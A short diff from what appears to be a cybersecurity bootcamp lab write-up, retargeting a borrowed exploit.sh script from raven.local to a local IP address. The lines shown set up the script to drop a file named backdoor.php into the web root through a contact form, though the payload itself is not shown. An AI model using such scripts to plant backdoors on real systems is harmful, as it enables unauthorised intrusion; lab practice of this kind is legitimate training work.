@@ -580,7 +580,7 @@ Using the provided `exploit.sh` script I made the modification to point to the c
 #!/bin/bash
 # Lovingly borrowed from: https://github.com/coding-boot-camp/cybersecurity-v2/new/master/1-Lesson-Plans/24-Final-Project/Activities/Day-1/Unsolved
 
-TARGET=http://raven.local/contact.php
+TARGET=http://192.168.1.115/contact.php
 
 DOCROOT=/var/www/html
 FILENAME=backdoor.php
